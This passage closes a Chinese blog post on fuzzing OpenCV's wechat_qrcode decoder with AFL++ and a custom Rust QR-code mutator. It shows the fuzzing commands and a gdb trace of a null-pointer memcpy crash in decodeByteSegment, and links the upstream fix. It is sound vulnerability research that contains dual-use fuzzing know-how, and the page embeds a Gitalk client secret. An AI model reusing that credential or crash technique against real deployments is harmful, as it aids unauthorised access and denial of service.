+        <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">push_header</span><span class="token punctuation">(</span><span class="token class-name">Mode</span><span class="token punctuation">::</span><span class="token class-name">Byte</span><span class="token punctuation">,</span> data_len<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> b <span class="token keyword">in</span> data <span class="token punctuation">&#123;</span>
+            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">push_number</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token keyword">u16</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>把 push_header 这里第二个参数用随机数替代，和python代码里一个意思。rust-qrcode 项目也需要添加rand crate依赖。</p>
+<br>
+<p>魔改完这个代码，生成的qrcode不能过 <code>ec.rs</code> 中 construct_codewords 函数的一个断言，我直接把这个断言注释了。</p>
+<br>
+<p>编译完得到的so文件路径指定传给下面这个环境变量</p>
+<p><code>export AFL_CUSTOM_MUTATOR_LIBRARY=/src/build/fuzzing/rust_mutator/target/debug/examples/libexample_mutator.so</code></p>
+<p>fuzzing cmd:</p>
+<p><code>AFL_CUSTOM_MUTATOR_ONLY=1 afl-fuzz -i corpus/ -o output_w_rust -t +5000 -- ./opencv_test_wechat_qrcode_persist</code></p>
+<br>
+<p>速度快不少，从每秒6次到每秒180次：</p>
+<p><img src="/images/wechatqrcodefuzz/Untitled%203.png" alt="Untitled" / srcset="/images/LoadingImage.gif" data-src="/images/wechatqrcodefuzz/Untitled%203.png" class="lozad post-image"></p>
+<br>
+<h2 id="manual-check"><a class="markdownIt-Anchor" href="#manual-check"></a> manual check</h2>
+<p>gdb， 根据上面的执行报错，断点敲一个在zxing::qrcode::DecodedBitStreamParser::decodeByteSegment上，敲一个在memcpy上，run。</p>
+<p>下面是读取第一个数据块时的情况，根据amd64的调用约定<code>void * __cdecl memcpy ( void * dst, const void * src, size_t count )</code>，顺序为rdi,rsi,rdx，rdx存了长度16，地址rsi存的是字符串“deadbeefdeadbeef”</p>
+<p><img src="/images/wechatqrcodefuzz/Untitled%204.png" alt="Untitled" / srcset="/images/LoadingImage.gif" data-src="/images/wechatqrcodefuzz/Untitled%204.png" class="lozad post-image"></p>
+<br>
+<p>继续执行，到下一个数据块读取，</p>
+<p><img src="/images/wechatqrcodefuzz/Untitled%205.png" alt="Untitled" / srcset="/images/LoadingImage.gif" data-src="/images/wechatqrcodefuzz/Untitled%205.png" class="lozad post-image"></p>
+<br>
+<p>memcpy要执行长度为13的copy，然而 <code>rsi</code>指向0x0，所以必然非法访问。</p>
+<br>
+<h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> summary</h2>
+<p>这个bug确实挺难fuzzing的，要针对decode过程针对性的设计mutator，才有可能快速找到，否则就只能一直在二维码图片解析上绕圈。</p>
+<p>我这里是因为先知道了bug在哪，然后针对性设计mutator，才顺利找到的，所以非常weak，要对所有字段都fuzzing的话那就要更大程度的重写qrcode的生成代码，还要对qrcode有比较深入的了解。</p>
+<p>另外，现在这个qrcode mutator只是随机变异，好像是不能利用到AFL++的power schedule，我感觉应该是没有顺利应用覆盖率导向。</p>
+<br>
+<p>作为一个学习的demo来说，就还行吧。</p>
+<br>
+<p>ref:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/opencv/opencv_contrib/pull/3480">fix(wechat_qrcode): Init nBytes after the count value is determined by Konano · Pull Request #3480 · opencv/opencv_contrib (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/2079/">针对二维码解析库的 Fuzzing 测试 (seebug.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://aflplus.plus/docs/fuzzing_in_depth/">Fuzzing in Depth | AFLplusplus</a></p>
+<p><a target="_blank" rel="noopener" href="https://merri.cx/qrazybox/">QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx)</a></p>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-info copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            Ch3nYe
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://ch3nye.top/wechat-qrcode-bug-fuzzing/">
+            https://ch3nye.top/wechat-qrcode-bug-fuzzing/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/createforkwashbadbeef/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">How to create a fork to wash the beef? </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+  
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+  
+<script src="/js/lib/md5.min.js"></script>
+
+  <script>
+    var gitalk = new Gitalk({
+      clientID: '049b30eb10ea05082ef1',
+      clientSecret: 'c33ad95041c69907b3136b895008320f000987db',
+      repo: 'Ch3nYe.github.io',
+      owner: 'Ch3nYe',
+      admin: "Ch3nYe",
+      id: md5(location.href),
+      distractionFreeMode: false,
+      language: 'navigator.language || navigator.userLanguage',
+      labels: ["Gitalk"],
+      perPage: 10
+    })
+
+    gitalk.render('gitalk-container')
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wechat-qrcode-bug-fuzzing"><span class="toc-text"> wechat qrcode bug fuzzing</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#afl-persistent-mode"><span class="toc-text"> AFL++ persistent mode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#custom-mutator"><span class="toc-text"> custom mutator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#custom-mutatorrust"><span class="toc-text"> custom mutator(Rust)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#manual-check"><span class="toc-text"> manual check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text"> summary</span></a></li></ol></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/images/logo.png" 
+    class="author-img"
+    width="88"
+    height="88"
+    alt="author avatar">
+
+<p class="author-name">Ch3nYe</p>
+<p class="author-description">如果有文章有任何错误请留言，谢谢🙏</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>50</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>7</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>72</span>
+    <span>标签</span>
+  </a>
+</div>
+
+  <div class="author-card-society">
+    
+      <div class="author-card-society-icon">
+        <a target="_blank" rel="noopener" href="https://github.com/ch3nye/">
+          <i class="iconfont icon-github society-icon"></i>
+        </a>
+      </div>
+    
+      <div class="author-card-society-icon">
+        <a href="mailto:sud0su@163.com">
+          <i class="iconfont icon-mail society-icon"></i>
+        </a>
+      </div>
+    
+  </div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wechat-qrcode-bug-fuzzing"><span class="toc-text"> wechat qrcode bug fuzzing</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#afl-persistent-mode"><span class="toc-text"> AFL++ persistent mode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#custom-mutator"><span class="toc-text"> custom mutator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#custom-mutatorrust"><span class="toc-text"> custom mutator(Rust)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#manual-check"><span class="toc-text"> manual check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text"> summary</span></a></li></ol></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/%E5%A4%87%E5%BF%98/">
+        <div class="categories-list-item">
+          备忘
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%94%9F%E6%B4%BB/">
+        <div class="categories-list-item">
+          生活
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+        <div class="categories-list-item">
+          李宏毅机器学习笔记
+          <span class="categories-list-item-badge">15</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/">
+        <div class="categories-list-item">
+          论文阅读
+          <span class="categories-list-item-badge">14</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E5%AE%9E%E6%88%98/">
+        <div class="categories-list-item">
+          实战
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%AC%94%E8%AE%B0/">
+        <div class="categories-list-item">
+          笔记
+          <span class="categories-list-item-badge">8</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BF%BB%E8%AF%91/">
+        <div class="categories-list-item">
+          翻译
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/Android/" 
+        title="Android">
+        <div class="tags-list-item">Android</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%B5%81%E9%87%8F%E6%8A%93%E5%8C%85/" 
+        title="流量抓包">
+        <div class="tags-list-item">流量抓包</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%95%99%E7%A8%8B/" 
+        title="教程">
+        <div class="tags-list-item">教程</div>
+      </a>
+    
+      <a 
+        href="/tags/Fiddler/" 
+        title="Fiddler">
+        <div class="tags-list-item">Fiddler</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%97%A5%E5%B8%B8/" 
+        title="日常">
+        <div class="tags-list-item">日常</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%89%8B%E8%AE%B0/" 
+        title="手记">
+        <div class="tags-list-item">手记</div>
+      </a>
+    
+      <a 
+        href="/tags/ML/" 
+        title="ML">
+        <div class="tags-list-item">ML</div>
+      </a>
+    
+      <a 
+        href="/tags/note/" 
+        title="note">
+        <div class="tags-list-item">note</div>
+      </a>
+    
+      <a 
+        href="/tags/Next-Step-of-ML/" 
+        title="Next-Step-of-ML">
+        <div class="tags-list-item">Next-Step-of-ML</div>
+      </a>
+    
+      <a 
+        href="/tags/%E8%AE%BA%E6%96%87/" 
+        title="论文">
+        <div class="tags-list-item">论文</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%AC%94%E8%AE%B0/" 
+        title="笔记">
+        <div class="tags-list-item">笔记</div>
+      </a>
+    
+      <a 
+        href="/tags/Intrusion-Detection/" 
+        title="Intrusion-Detection">
+        <div class="tags-list-item">Intrusion-Detection</div>
+      </a>
+    
+      <a 
+        href="/tags/Deep-Learning/" 
+        title="Deep-Learning">
+        <div class="tags-list-item">Deep-Learning</div>
+      </a>
+    
+      <a 
+        href="/tags/Hot-Patch/" 
+        title="Hot-Patch">
+        <div class="tags-list-item">Hot-Patch</div>
+      </a>
+    
+      <a 
+        href="/tags/Attack/" 
+        title="Attack">
+        <div class="tags-list-item">Attack</div>
+      </a>
+    
+      <a 
+        href="/tags/Backdoor/" 
+        title="Backdoor">
+        <div class="tags-list-item">Backdoor</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wechat-qrcode-bug-fuzzing"><span class="toc-text"> wechat qrcode bug fuzzing</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#afl-persistent-mode"><span class="toc-text"> AFL++ persistent mode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#custom-mutator"><span class="toc-text"> custom mutator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#custom-mutatorrust"><span class="toc-text"> custom mutator(Rust)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#manual-check"><span class="toc-text"> manual check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text"> summary</span></a></li></ol></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2023-06-27</div>
+        <a href="/wechat-qrcode-bug-fuzzing/"><div class="recent-posts-item-content">wechat qrcode bug fuzzing</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2023-03-24</div>
+        <a href="/createforkwashbadbeef/"><div class="recent-posts-item-content">How to create a fork to wash the beef?</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2023-01-21</div>
+        <a href="/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"><div class="recent-posts-item-content">2022 年终总结</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-10-27</div>
+        <a href="/%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%87%BD%E6%95%B0%E5%90%8D%E6%81%A2%E5%A4%8D%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/"><div class="recent-posts-item-content">基于机器学习的函数名恢复总结（下）</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2023
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          ch3nye's blog
+        </a>
+      </div>
+    </div>
+
+    
+      <div class="footer-dsc">
+        
+          Powered by
+          <a 
+            href="https://hexo.io/" 
+            class="footer-link" 
+            target="_blank" 
+            rel="nofollow noopener noreferrer">
+            &nbsp;Hexo
+          </a>
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          Theme -
+          <a 
+            href="https://github.com/theme-kaze" 
+            class="footer-link" 
+            target="_blank"
+            rel="nofollow noopener noreferrer">
+            &nbsp;Kaze
+          </a>
+        
+      </div>
+    
+    
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+<!-- Default Statcounter code for My Blog https://ch3nye.top -->
+<script type="text/javascript">
+var sc_project=12696483; 
+var sc_invisible=1; 
+var sc_security="0f70f90d"; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js" async></script>
+<noscript><div class="statcounter"><a title="Web Analytics"
+href="https://statcounter.com/" target="_blank"><img class="statcounter"
+src="https://c.statcounter.com/12696483/0/0f70f90d/1/" alt="Web Analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+<!-- End of Statcounter Code -->
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton"
+  aria-label="menu button"
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+      
+
+  
+  
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css">
+
+  
+ 
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+      <script>
+        var googleAnalytics = function () {
+          window.dataLayer = window.dataLayer || []
+          function gtag() {
+            dataLayer.push(arguments)
+          }
+          gtag('js', new Date())
+          gtag('config', 'G-WHGL11014T')
+        }
+    </script>
+      <script>
+        loadScript(
+          'https://www.googletagmanager.com/gtag/js?id=' +
+            'G-WHGL11014T',
+          googleAnalytics
+        )
+      </script>
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
